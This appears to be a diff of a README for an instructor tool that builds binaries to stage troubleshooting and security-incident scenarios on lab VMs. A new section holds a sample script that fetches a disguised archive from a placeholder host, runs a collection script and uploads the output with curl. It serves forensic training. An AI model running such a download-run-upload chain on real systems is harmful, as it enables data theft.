@@ -4,13 +4,13 @@ Troublevent is a Troublemaker and Event creator (troublevent) to run scenarios t
 
 ## What exactly does it do?
 
-In my cybersecurity and system admin classes, I want students to learn troubleshooting.  Using troublevent, a triblet (a single instance of a binary) can be created that will edit a configuration file such as "/etc/dhcp/dhcpd.conf" and then restart the service.  The 'edit' may change a setting that causes the DHCP server to not work properly or offers IP addresses not valid for the LAN.  The student has to go through troubleshooting processes to find the issue and correct it.  The binary they run is created by an instructor or anyone teaching troubleshooting.  A message is printed after the change is made with a statement explaining what they 'would' have done.  For example, in the previous scenario a message may be:
+In my cybersecurity and system admin classes, I want students to learn troubleshooting and learn commands system and security admins use.  Using troublevent, a triblet (a single instance of a binary) can be created that will edit a configuration file such as "/etc/dhcp/dhcpd.conf" and then restart the service.  The 'edit' may change a setting that causes the DHCP server to not work properly or offers IP addresses not valid for the LAN.  The student has to go through troubleshooting processes to find the issue and correct it.  The binary they run is created by an instructor or anyone teaching troubleshooting.  A message is printed after the change is made with a statement explaining what they 'would' have done.  For example, in the previous scenario a message may be:
 
     You have just edited the DHCP configuration file and restarted the service.  Users are reporting they are not able to obtain an IP address.
     
 that way it provides some context to what they should be looking for because that is likely how they will recognize problems, when the users start reporting problems.
 
-It is recommended to keep the scenarios as realistic as possible.
+It is recommended to keep the scenarios as realistic as possible.  This prevents having to create multiple VMs with a unique scenario.  Give them one VM and then run the triblet to create a troubleshooting or security event.
 
 ## Do I have to know programming?
 
@@ -30,11 +30,9 @@ Create security events that require the user to investigate.  Example, brute for
 
 - Randomly assign triblets for an assignment, DB backend to track users and the triblets they receive through web auth or some sort of auth.
 
-- Run multiple commands to simulate behavior for an investigation. (Atomic Read Team tests could be a triblet to generate adversarial behavior)
-
-- Support commands with multiple pipes - currently only one is supported.
-
 - Create a GUI instead of editing the YAML file and build the binary.
+
+NOTE: Running multiple commands and commands with multiple pipes can be performed using the 'runScript' creator.
 
 ## Setup
 
@@ -113,7 +111,7 @@ Fix any issues and then build.
 
 `go build -o Lab23.bin`
 
-During a bootcamp, the student reads the lab guide and unzips the respective file "Lab23.zip."  Inside is the file Lab23.bin The student executes "Lab23.bin" and sees the message "You just edited the /etc/dhcp/dhcpd.conf file and restarted the service. Users are reporting they are not able to receive an IP address..  That should queue them to check the appropriate log file to determine the error. DHCP is quite good at explaining the error and where it is located.
+During a bootcamp, the student reads the lab guide and unzips the respective file "Lab23.zip."  Inside is the file Lab23.bin The student executes "Lab23.bin" and sees the message "You just edited the /etc/dhcp/dhcpd.conf file and restarted the service. Users are reporting they are not able to receive an IP address."  That should queue them to check the appropriate log file to determine the error. DHCP is quite good at explaining the error and where it is located.
 
 ### Create a binary that runs ps -ef and the student has to determine the command that printed the output.
 
@@ -161,3 +159,56 @@ Fix any issues and then build.
 `go build -o Question1Week9Lab.exe`
 
 The triblet gets posted to a web server and the student downloads it and executes 'Question1Week9Lab.exe' and should be able to respond that the cmdlet Get-Process was executed based on the output.
+
+### Simulate an 'acker downloading a script, excuting it, and uploading the results.
+Here you can test a new hires forensic skills based on what information they ask for to start the investigation and the process they perform to determine what happened.  Test their network flow analysis and host-based forensic analysis skills to determine what occurred on the host.
+
+`cp -r runscript Lab18`
+
+`cd Lab18`
+
+`gedit script.yaml`
+     
+     ---
+       # Filename for the script. Temporary and will be deleted
+       # just before the triblet terminates.
+       theFile: "first.bash"
+       # Shell to execute the script.
+       # theShell: powershell.exe
+       # theShell: cmd.exe
+       theShell: "/usr/bin/bash"
+       # For the script, indent 2 spaces under "theScript: |-2
+       # In order to preserve the newlines.
+       # Leave: theScript: |-2
+       # It tells the viper parser to preserve newlines
+       # for lines with two space indentions under the key: theScript
+       # Be sure the last line of the script is: exit 0
+       # so it can be deleted before the triblet terminates
+       theScript: |-2
+         #!/bin/bash
+
+         ## Simulate a script collection and upload
+         wget hxxp://somehost/aserq.jpg -O files.zip
+         unzip files.zip
+         cd files
+         chmod +x collect.sh
+         ./collect.sh
+         gzip output.txt
+         curl -F 'f=output.gz' hxxp://anotherhose/upload.php
+
+         # Be sure to include exit 0
+         # so the script will be deleted
+         # by the triblet.
+         exit 0
+         # Or just ask the user what command was used to generate the output
+         theMsg: "An IDS alerted to a host communicating with a known malicious IP. Investigate and find out what happened."
+
+Save the file and run:
+
+`go run script.go`
+
+Fix any issues and then build.
+
+`go build -o Lab18.bin`
+
+You have a new incident response hire and assessing their skill level to determine the training and mentoring they need.  On a VM, the new hire downloads Lab18.bin and then sees the message "An IDS alerted to a host communicating with a known malicious IP. Investigate and find out what happened."
